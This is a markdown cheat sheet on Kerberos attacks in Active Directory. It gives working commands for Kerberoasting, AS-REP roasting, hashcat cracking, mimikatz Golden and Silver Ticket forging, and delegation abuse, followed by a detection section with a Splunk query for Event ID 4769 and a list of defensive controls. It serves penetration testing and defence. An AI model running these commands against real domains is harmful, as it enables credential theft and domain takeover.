---
description: Kerberoasting, AS-REP roasting, Golden/Silver Tickets, delegation abuse, RBCD, detection via Event ID 4769, hashcat modes
---

# Kerberos Attacks

## Kerberoasting (T1558.003)
```powershell
# Find accounts with SPN set
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
setspn -T domain -Q */*
# Request and crack TGS tickets
Invoke-Kerberoast -OutputFormat Hashcat | fl
# Or with Rubeus
Rubeus.exe kerberoast
```
```bash
hashcat -m13100 tgs_hashes.txt wordlist.txt
```

## AS-REP Roasting
- Targets accounts with "Do not require Kerberos preauthentication"
```cmd
Rubeus.exe asreproast
```
```bash
# Insert $23$ after $krb5asrep$ then crack
hashcat -m18200 asrep_hash.txt wordlist.txt
```

## Golden Ticket (requires krbtgt hash)
```
# Extract krbtgt hash (needs DC admin)
lsadump::lsa /inject /name:krbtgt
# Forge TGT
kerberos::golden /domain:DOMAIN /sid:S-1-5-21-... /rc4:KRBTGT_HASH /user:fakeAdmin /id:500 /ptt
```
- Grants access to any service in the domain

## Silver Ticket (requires service account hash)
```
kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN /ptt /target:SERVER /service:http /rc4:SVC_HASH /user:fakeUser
```
- Forged TGS for specific service; no DC validation needed

## Unconstrained Delegation
```powershell
# Find delegation hosts
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515}
```
- Any user authenticating to delegation host caches their TGT in memory
- Dump with mimikatz: `sekurlsa::tickets /export`

## Resource-Based Constrained Delegation (RBCD)
- Requires WRITE on target computer object
- Create fake computer, set `msDS-AllowedToActOnBehalfOfOtherIdentity` on target
- Use Rubeus S4U to impersonate admin to target

## Detection & Defense

### Kerberoasting Detection
- **Event ID 4769** (Service Ticket Request) with encryption type 0x17 (RC4) — RC4 downgrade is primary indicator
- Filter out machine accounts (names ending with `$`) and expected service requests
- High volume of 4769 events from single source in short window = Kerberoasting sweep

Splunk:
```
index=windows EventCode=4769 Ticket_Encryption_Type=0x17 | where NOT match(Service_Name, "\$$") | stats count by src_ip, Service_Name | where count > 5
```

### Hashcat Reference
| Attack | Mode | Example |
|--------|------|---------|
| Kerberoasting (RC4) | 13100 | `hashcat -m 13100 tgs.txt rockyou.txt` |
| Kerberoasting (AES-256) | 19700 | `hashcat -m 19700 tgs_aes.txt rockyou.txt` |
| AS-REP Roasting | 18200 | `hashcat -m 18200 asrep.txt rockyou.txt` |

### Defensive Controls
- Use Group Managed Service Accounts (gMSA) — automatic 120-char password rotation
- Enforce AES-only encryption (disable RC4 on service accounts)
- Add service accounts to Protected Users group
- Monitor for RC4 ticket requests in environment that should be AES-only
